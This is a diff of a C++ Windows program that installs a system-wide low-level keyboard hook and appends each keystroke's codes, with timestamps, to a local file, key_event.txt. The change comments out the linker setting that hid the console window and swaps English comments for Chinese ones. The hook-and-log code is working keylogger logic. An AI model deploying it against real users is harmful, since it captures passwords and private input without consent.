@@ -22,7 +22,8 @@
 #include <iostream>
 
 using namespace std;
-#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
+// 是不是显示窗口
+//#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
 
 mutex mtx;
 map<wstring, time_t> map_process;
@@ -90,10 +91,10 @@ LRESULT CALLBACK kb_proc(int code, WPARAM w, LPARAM l)
 
     printf("time %d : %s - vkCode [%04x], scanCode [%04x]\n",
         now, info, p->vkCode, p->scanCode);
-
+	// 写入文件
 	sprintf_s(kb_str, "time %d : %s - vkCode [%04x], scanCode [%04x]\n", now, info, p->vkCode, p->scanCode);
 	write_string_to_file_append(string("key_event.txt"), string(kb_str));
-    // always call next hook
+    // 调用下一个hook
     return CallNextHookEx(g_kb_hook, code, w, l);
 };
 
@@ -101,29 +102,31 @@ DWORD WINAPI KbHookThread(LPVOID lpParam)
 {
     g_main_tid = GetCurrentThreadId();
 
-    //register Ctrl+C callback
+    
     SetConsoleCtrlHandler((PHANDLER_ROUTINE)&con_handler, TRUE);
 
-    g_kb_hook = SetWindowsHookEx(WH_KEYBOARD_LL, //Installs a hook procedure that monitors low-level keyboard input events
-        (HOOKPROC)&kb_proc, //A hook procedure that monitors low-level keyboard input events
-        NULL,//A handle to the DLL containing the hook procedure pointed to by the lpfn parameter. The hMod parameter must be set to NULL if the dwThreadId parameter specifies a thread created by the current process and if the hook procedure is within the code associated with the current process.(GetModuleHandle(NULL))
-        0);//The identifier of the thread with which the hook procedure is to be associated. For desktop apps, if this parameter is zero, the hook procedure is associated with all existing threads running in the same desktop as the calling thread. For Windows Store apps, see the Remarks section.
+	// hook
+    g_kb_hook = SetWindowsHookEx(WH_KEYBOARD_LL, 
+        (HOOKPROC)&kb_proc, 
+        NULL,
+        0);
+
     if (g_kb_hook == NULL) {
         printf("SetWindowsHookEx failed, %ld\n", GetLastError());
         return 0;
     }
 
-    // Message loop
+    
     MSG msg;
 
 
-    //If GetMessage retrieves the WM_QUIT message, the return value is zero.
+    
     while (GetMessage(&msg, NULL, 0, 0)) {
         TranslateMessage(&msg);
         DispatchMessage(&msg);
     }
 
-    //exit the thread
+  
     UnhookWindowsHookEx(g_kb_hook);
     return 0;
 };
@@ -142,6 +145,7 @@ int main()
     //阻塞主线程，等待线程退出
     WaitForMultipleObjects(1, &h, TRUE, INFINITE);
 
+	th.join();
     return 0;
 }
 
